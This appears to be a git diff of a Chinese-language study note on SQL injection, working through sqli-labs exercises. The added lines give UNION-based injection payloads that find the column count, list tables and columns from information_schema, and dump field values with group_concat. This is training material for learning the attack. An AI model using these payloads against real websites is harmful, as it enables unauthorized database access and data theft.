@@ -1,11 +1,5 @@
 ---
 title: SQL_Injection
-categories:
-- Network_Security
-- Web
-- SQL_Injection
-tags:
-- Network_Security
 ---
 # 1. 定义
 
@@ -15,15 +9,18 @@ tags:
 
 ## 1. Less-1（字符串型）
 
-1. `group_concat()` 将查询结果拼凑成一个字符串
+1. `id = 1 order by 数字`。报错与不报错的交错处就是列数。
 
-2. 所有的表：information_schema.tables 这个表的 table_name 这个列的值
+2. `group_concat()` 将查询结果拼凑成一个字符串
 
-    `union select 1,group_concat(table_name), 3 from information_schema.tables where table_schema=database()`
+3. 所有的表：information_schema.tables 这个表的 table_name 这个列的值
+
+    `id = -1 union select 1,group_concat(table_name), 3 from information_schema.tables where table_schema=database()`
 
     注意：`union select` 前面是 `select` 的话不要加 and
+    用联合查询的时候要传入非法值/没有数据的值。
 
-3. 查当前数据库名：`database()`
+4. 查当前数据库名：`database()`
 
     查数据库版本：`version()`
 
@@ -31,13 +28,20 @@ tags:
 
     显示数据库所在路径：`@@datadir`
 
-4. 表中的所有列名：information_schema.columns 这个表的 columns_name 这个列的值
+5. 表中的所有列名：information_schema.columns 这个表的 columns_name 这个列的值
 
     `union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name = 'users'`
 
     table_schema 用来指定要查询的具体数据库名，table_name 指定要查询的表的名字
 
-5. 用联合查询的时候要查不到具体值。
+6. 显示字段值：
+    `id=-1 union select 1,group_concat(字段 1,0x3a,字段 2),3,4 from xxx -- -（注入出字段值）`
+
+7. 补充一下 `group_concat()` 函数的作用：
+
+    > 功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。
+    >
+    > 语法：**group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator '分隔符'] )**
 
 ## 2. Less-2（整数型）
 
